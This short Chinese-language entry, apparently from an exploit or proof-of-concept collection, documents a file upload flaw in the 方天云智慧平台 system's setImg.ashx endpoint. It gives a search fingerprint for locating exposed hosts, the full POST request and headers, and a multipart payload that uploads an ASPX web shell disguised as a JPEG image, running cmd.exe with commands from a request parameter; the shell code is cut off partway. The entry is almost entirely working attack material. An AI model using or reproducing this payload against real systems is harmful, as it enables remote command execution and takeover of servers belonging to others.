# 方天云智慧平台系统setImg.ashx存在文件上传漏洞

- **系统**：方天云智慧平台系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="AjaxMethods.asmx/GetCompanyItem"`
- **请求**：`POST /Data/setImg.ashx HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: multipart/form-data; boundary=----21909179191068471382830692…`

**请求体 / payload**
```
------21909179191068471382830692394
Content-Disposition: form-data; name="Filedata"; filename="asd.aspx"
Content-Type: image/jpeg
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Dele…（脚本共 680 字，完整版见原文）
```
- **预期**：200　|　http://ip/UploadFile/CustomerFile/回显路径